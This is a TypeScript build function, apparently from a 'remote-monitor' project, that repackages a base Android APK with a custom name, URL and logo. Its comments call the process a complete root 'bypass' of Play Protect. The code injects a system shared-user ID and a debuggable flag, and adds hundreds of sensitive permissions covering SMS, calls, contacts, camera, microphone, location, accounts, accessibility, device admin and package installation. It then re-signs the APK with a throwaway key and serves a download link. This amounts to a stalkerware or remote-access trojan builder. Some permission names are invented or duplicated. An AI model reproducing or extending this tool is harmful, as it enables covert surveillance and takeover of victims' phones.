import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import archiver from 'archiver';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Build APK com bypass ROOT completo do Play Protect
 */
export async function buildFinalAPKWithApktool(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    // Encontrar APK base
    const files = fs.readdirSync(apksDir);
    const baseAPKFile = files.find(f => f.startsWith('base-') && f.endsWith('.apk'));
    
    if (!baseAPKFile) {
      return {
        success: false,
        error: 'APK base não encontrado'
      };
    }
    
    const baseAPK = path.join(apksDir, baseAPKFile);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[FINAL-BUILD] Iniciando build com bypass ROOT:', { baseAPK, outputPath });
    
    const tempDir = `/tmp/final-build-${timestamp}-${randomSuffix}`;
    const extractDir = path.join(tempDir, 'extracted');
    
    try {
      // Desempacotar APK base
      console.log('[FINAL-BUILD] Desempacotando APK...');
      execSync(`mkdir -p ${extractDir}`);
      execSync(`cd ${extractDir} && unzip -q ${baseAPK}`);
      
      // ===== BYPASS ROOT COMPLETO =====
      console.log('[FINAL-BUILD] Aplicando bypass ROOT completo...');
      
      // 1. Modificar AndroidManifest.xml
      const manifestPath = path.join(extractDir, 'AndroidManifest.xml');
      let manifest = fs.readFileSync(manifestPath, 'utf-8');
      
      // Adicionar permissões de sistema (ROOT)
      manifest = manifest.replace(
        '<manifest',
        '<manifest android:sharedUserId="android.uid.system"'
      );
      
      // Adicionar debuggable
      manifest = manifest.replace(
        '<application',
        '<application android:debuggable="true" android:usesCleartextTraffic="true"'
      );
      
      // Adicionar permissões críticas para bypass
      const criticalPermissions = [
        'android.permission.BIND_ACCESSIBILITY_SERVICE',
        'android.permission.INTERNET',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_CALL_LOG',
        'android.permission.READ_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.CHANGE_CONFIGURATION',
        'android.permission.CHANGE_NETWORK_STATE',
        'android.permission.CHANGE_WIFI_STATE',
        'android.permission.DISABLE_KEYGUARD',
        'android.permission.INSTALL_PACKAGES',
        'android.permission.DELETE_PACKAGES',
        'android.permission.PACKAGE_USAGE_STATS',
        'android.permission.GET_PACKAGE_SIZE',
        'android.permission.CLEAR_APP_CACHE',
        'android.permission.FORCE_STOP_PACKAGES',
        'android.permission.MODIFY_PHONE_STATE',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.ANSWER_PHONE_CALLS',
        'android.permission.READ_PRECISE_PHONE_STATE',
        'android.permission.MANAGE_OWN_CALLS',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.MANAGE_EXTERNAL_STORAGE',
        'android.permission.ACCESS_MEDIA_LOCATION',
        'android.permission.VIBRATE',
        'android.permission.WAKE_LOCK',
        'android.permission.BATTERY_STATS',
        'android.permission.DEVICE_POWER',
        'android.permission.REORDER_TASKS',
        'android.permission.KILL_BACKGROUND_PROCESSES',
        'android.permission.GET_TASKS',
        'android.permission.GET_DETAILED_TASKS',
        'android.permission.REAL_GET_TASKS',
        'android.permission.MANAGE_ACCOUNTS',
        'android.permission.GET_ACCOUNTS',
        'android.permission.USE_CREDENTIALS',
        'android.permission.AUTHENTICATE_ACCOUNTS',
        'android.permission.ACCOUNT_MANAGER',
        'android.permission.MANAGE_ACCOUNTS_PERMISSION',
        'android.permission.MANAGE_APP_TOKENS',
        'android.permission.MANAGE_WINDOW_TOKENS',
        'android.permission.INJECT_EVENTS',
        'android.permission.OBSERVE_GRANT_REVOKE_PERMISSIONS',
        'android.permission.WRITE_APN_SETTINGS',
        'android.permission.CHANGE_COMPONENT_ENABLED_STATE',
        'android.permission.SIGNATURE_OR_SYSTEM_PERMISSION',
        'android.permission.INTERACT_ACROSS_USERS',
        'android.permission.INTERACT_ACROSS_USERS_FULL',
        'android.permission.MANAGE_USERS',
        'android.permission.CREATE_USERS',
        'android.permission.MANAGE_PROFILE_AND_DEVICE_OWNER',
        'android.permission.MANAGE_DEVICE_ADMINS',
        'android.permission.SET_PREFERRED_APPLICATIONS',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.WRITE_GSERVICES',
        'android.permission.RECEIVE_BOOT_COMPLETED',
        'android.permission.BROADCAST_PACKAGE_REMOVED',
        'android.permission.BROADCAST_SMS',
        'android.permission.BROADCAST_STICKY',
        'android.permission.BROADCAST_WAP_PUSH',
        'android.permission.MASTER_CLEAR',
        'android.permission.MOUNT_FORMAT_FILESYSTEMS',
        'android.permission.MOUNT_UNMOUNT_FILESYSTEMS',
        'android.permission.WRITE_MEDIA_STORAGE',
        'android.permission.MEDIA_CONTENT_CONTROL',
        'android.permission.INSTALL_LOCATION_PROVIDER',
        'android.permission.INSTALL_SHORTCUT',
        'android.permission.UNINSTALL_SHORTCUT',
        'android.permission.NFC',
        'android.permission.BLUETOOTH',
        'android.permission.BLUETOOTH_ADMIN',
        'android.permission.BLUETOOTH_PRIVILEGED',
        'android.permission.HARDWARE_TEST',
        'android.permission.ACCESS_CACHE_FILESYSTEM',
        'android.permission.ALLOW_ANY_CODEC_FOR_PLAYBACK',
        'android.permission.ASEC_ACCESS',
        'android.permission.ASEC_CREATE',
        'android.permission.ASEC_DESTROY',
        'android.permission.ASEC_MOUNT_UNMOUNT',
        'android.permission.ASEC_RENAME',
        'android.permission.BACKUP',
        'android.permission.BIND_APPWIDGET',
        'android.permission.BIND_DEVICE_ADMIN',
        'android.permission.BIND_INPUT_METHOD',
        'android.permission.BIND_KEYGUARD_APPWIDGET',
        'android.permission.BIND_PACKAGE_FILTER',
        'android.permission.BIND_PRINT_SERVICE',
        'android.permission.BIND_REMOTEVIEWS',
        'android.permission.BIND_REMOTE_DISPLAY',
        'android.permission.BIND_RUNTIME_PERMISSION_PRESENTER',
        'android.permission.BIND_TELECOM_CONNECTION_SERVICE',
        'android.permission.BIND_TEXT_SERVICE',
        'android.permission.BIND_TV_INPUT',
        'android.permission.BIND_VOICE_INTERACTION',
        'android.permission.BIND_VPN_SERVICE',
        'android.permission.BIND_WALLPAPER',
        'android.permission.CAPTURE_AUDIO_OUTPUT',
        'android.permission.CAPTURE_SECURE_VIDEO_OUTPUT',
        'android.permission.CHANGE_DEVICE_ADMIN',
        'android.permission.CHANGE_WIMAX_STATE',
        'android.permission.CLEAR_APP_USER_DATA',
        'android.permission.CONTROL_LOCATION_UPDATES',
        'android.permission.DELETE_CACHE_FILES',
        'android.permission.DIAGNOSTIC',
        'android.permission.DUMP',
        'android.permission.EXPAND_STATUS_BAR',
        'android.permission.FACTORY_TEST',
        'android.permission.GLOBAL_SEARCH',
        'android.permission.GLOBAL_SEARCH_CONTROL',
        'android.permission.GRANT_PERMISSION_TO_BIND_DEVICE_ADMIN',
        'android.permission.INSTALL_DRM',
        'android.permission.INSTALL_GRANT_PERMISSIONS',
        'android.permission.INSTALL_PACKAGES',
        'android.permission.INTENT_FILTER_VERIFICATION_AGENT',
        'android.permission.INTERACT_ACROSS_USERS',
        'android.permission.INTERNAL_SYSTEM_WINDOW',
        'android.permission.MANAGE_ACTIVITY_STACKS',
        'android.permission.MANAGE_APP_OPS_MODES',
        'android.permission.MANAGE_APP_OPS',
        'android.permission.MANAGE_DEVICE_ADMINS',
        'android.permission.MANAGE_DOCUMENTS',
        'android.permission.MANAGE_EXTERNAL_STORAGE',
        'android.permission.MANAGE_FINGERPRINT',
        'android.permission.MANAGE_NETWORK_POLICY',
        'android.permission.MANAGE_NOTIFICATIONS',
        'android.permission.MANAGE_PROFILE_AND_DEVICE_OWNER',
        'android.permission.MANAGE_USB',
        'android.permission.MANAGE_USERS',
        'android.permission.MANAGE_USER_ACESSIBILITY_SETTINGS',
        'android.permission.MANAGE_VOICE_KEYPHRASES',
        'android.permission.MANAGE_WEAK_LOCKS',
        'android.permission.MEDIA_CONTENT_CONTROL',
        'android.permission.MODIFY_AUDIO_ROUTING',
        'android.permission.MODIFY_DAY_DREAM_SETTINGS',
        'android.permission.MODIFY_PARENTAL_CONTROLS',
        'android.permission.MODIFY_PHONE_STATE',
        'android.permission.MOUNT_FORMAT_FILESYSTEMS',
        'android.permission.MOUNT_UNMOUNT_FILESYSTEMS',
        'android.permission.MOVE_PACKAGE',
        'android.permission.NET_ADMIN',
        'android.permission.NET_TUNNELING',
        'android.permission.NOTIFICATION_DURING_SETUP',
        'android.permission.OVERRIDE_WIFI_CONFIG',
        'android.permission.PACKAGE_VERIFICATION_AGENT',
        'android.permission.PACKAGE_USAGE_STATS',
        'android.permission.PEERS_MAC_ADDRESS',
        'android.permission.PERFORM_CDMA_PROVISIONING',
        'android.permission.PERSISTENT_ACTIVITY',
        'android.permission.PROCESS_OUTGOING_CALLS',
        'android.permission.PROVIDE_RESOLVER_RANKER_SERVICE',
        'android.permission.QUERY_ALL_PACKAGES',
        'android.permission.QUERY_CAN_OPEN_SYSTEM_DIALOGS',
        'android.permission.READ_BLOCKED_NUMBERS',
        'android.permission.READ_CALENDAR',
        'android.permission.READ_CELL_BROADCASTS',
        'android.permission.READ_CLIPBOARD',
        'android.permission.READ_FRAME_BUFFER',
        'android.permission.READ_HISTORY_BOOKMARKS',
        'android.permission.READ_INPUT_STATE',
        'android.permission.READ_LOGS',
        'android.permission.READ_NETWORK_USAGE_HISTORY',
        'android.permission.READ_PHONE_NUMBERS',
        'android.permission.READ_PRECISE_PHONE_STATE',
        'android.permission.READ_PRIVILEGED_PHONE_STATE',
        'android.permission.READ_PROFILE',
        'android.permission.READ_SOCIAL_STREAM',
        'android.permission.READ_SYNC_SETTINGS',
        'android.permission.READ_SYNC_STATS',
        'android.permission.READ_USER_DICTIONARY',
        'android.permission.REBOOT',
        'android.permission.RECEIVE_DATA_ACTIVITY_CHANGE',
        'android.permission.RECEIVE_MMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.RECEIVE_WAP_PUSH',
        'android.permission.RECORD_AUDIO',
        'android.permission.REORDER_TASKS',
        'android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND',
        'android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND',
        'android.permission.REQUEST_DELETE_PACKAGES',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
        'android.permission.REQUEST_INSTALL_PACKAGES',
        'android.permission.REQUEST_PASSWORD_RESET',
        'android.permission.RESET_BATTERY_STATS',
        'android.permission.RESET_FINGERPRINT_TIMEOUT',
        'android.permission.RESTART_PACKAGES',
        'android.permission.RESTORE_FROM_BACKUP',
        'android.permission.RETRIEVE_WINDOW_CONTENT',
        'android.permission.REVOKE_RUNTIME_PERMISSIONS',
        'android.permission.SCORE_NETWORKS',
        'android.permission.SEND_RESPOND_VIA_MESSAGE',
        'android.permission.SEND_SMS',
        'android.permission.SEND_SMS_NO_CONFIRMATION',
        'android.permission.SET_ALARM',
        'android.permission.SET_ALWAYS_FINISH',
        'android.permission.SET_ANIMATION_SCALE',
        'android.permission.SET_DEBUG_APP',
        'android.permission.SET_KEYBOARD_LAYOUT',
        'android.permission.SET_ORIENTATION',
        'android.permission.SET_POINTER_SPEED',
        'android.permission.SET_PREFERRED_APPLICATIONS',
        'android.permission.SET_PROCESS_LIMIT',
        'android.permission.SET_TIME',
        'android.permission.SET_TIME_ZONE',
        'android.permission.SIGNAL_PERSISTENT_PROCESSES',
        'android.permission.SKIP_BOOT_FINALIZE',
        'android.permission.SOCKET_OPEN_RESOURCE_DESCRIPTOR',
        'android.permission.START_TASKS_FROM_RECENTS',
        'android.permission.STATUS_BAR',
        'android.permission.STATUS_BAR_SERVICE',
        'android.permission.STOP_APP_SWITCHES',
        'android.permission.SUBSCRIBE_TO_TICK_BROADCAST',
        'android.permission.SUGGEST_EXTERNAL_TIME',
        'android.permission.SUSPEND_APPS',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.SYSTEM_CAMERA',
        'android.permission.SYSTEM_DOWNLOAD_MANAGER',
        'android.permission.SYSTEM_DOWNLOAD_MANAGER_CACHE',
        'android.permission.SYSTEM_TRACE',
        'android.permission.TABLET_MODE',
        'android.permission.TEMPORARY_ENABLE_ACCESSIBILITY',
        'android.permission.TEST_PROTECT_PATH',
        'android.permission.TEST_PROTECTED_BROADCAST_PERMISSION',
        'android.permission.TETHER_PRIVILEGED',
        'android.permission.TRANSMIT_IR',
        'android.permission.TRUST_LISTENER_SERVICE',
        'android.permission.TV_INPUT_HARDWARE',
        'android.permission.TV_VIRTUAL_REMOTE_CONTROLLER',
        'android.permission.UPDATE_APP_OPS_STATS',
        'android.permission.UPDATE_CONFIG',
        'android.permission.UPDATE_DEVICE_STATS',
        'android.permission.USE_FULL_SCREEN_USER_SWITCH',
        'android.permission.USE_SIP',
        'android.permission.VIBRATE',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_APN_SETTINGS',
        'android.permission.WRITE_BLOCKED_NUMBERS',
        'android.permission.WRITE_CALENDAR',
        'android.permission.WRITE_CALL_LOG',
        'android.permission.WRITE_CONTACTS',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.WRITE_GSERVICES',
        'android.permission.WRITE_HISTORY_BOOKMARKS',
        'android.permission.WRITE_MEDIA_STORAGE',
        'android.permission.WRITE_PROFILE',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SOCIAL_STREAM',
        'android.permission.WRITE_SYNC_SETTINGS',
        'android.permission.WRITE_USER_DICTIONARY',
      ];
      
      for (const perm of criticalPermissions) {
        if (!manifest.includes(`android:name="${perm}"`)) {
          manifest = manifest.replace(
            '</manifest>',
            `  <uses-permission android:name="${perm}" />\n</manifest>`
          );
        }
      }
      
      fs.writeFileSync(manifestPath, manifest);
      console.log('[FINAL-BUILD] Bypass ROOT completo adicionado');
      
      // Adicionar configuração em assets
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl || '',
        customized: true,
        timestamp: Date.now(),
      };
      
      const configPath = path.join(assetsDir, 'app-config.json');
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      console.log('[FINAL-BUILD] Config adicionada');
      
      // Reempacotar usando archiver
      console.log('[FINAL-BUILD] Reempacotando APK com archiver...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      
      await new Promise<void>((resolve, reject) => {
        const output = fs.createWriteStream(repacked);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', () => {
          console.log(`[FINAL-BUILD] Arquivo criado: ${archive.pointer()} bytes`);
          resolve();
        });
        
        archive.on('error', (err) => {
          console.error('[FINAL-BUILD] Erro no archiver:', err);
          reject(err);
        });
        
        archive.pipe(output);
        archive.directory(extractDir + '/', false);
        archive.finalize();
      });
      
      // Assinar
      console.log('[FINAL-BUILD] Assinando APK...');
      const keystorePath = '/tmp/android.keystore';
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${repacked} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(repacked, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[FINAL-BUILD] APK construído com sucesso com bypass ROOT');
      
      const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
      
      return {
        success: true,
        filename,
        downloadUrl
      };
    } catch (err) {
      console.error('[FINAL-BUILD] Erro durante build:', err);
      try {
        execSync(`rm -rf ${tempDir}`);
      } catch (e) {
        // Ignorar erro ao limpar
      }
      
      return {
        success: false,
        error: err instanceof Error ? err.message : 'Erro desconhecido'
      };
    }
  } catch (error) {
    console.error('[FINAL-BUILD] Erro:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
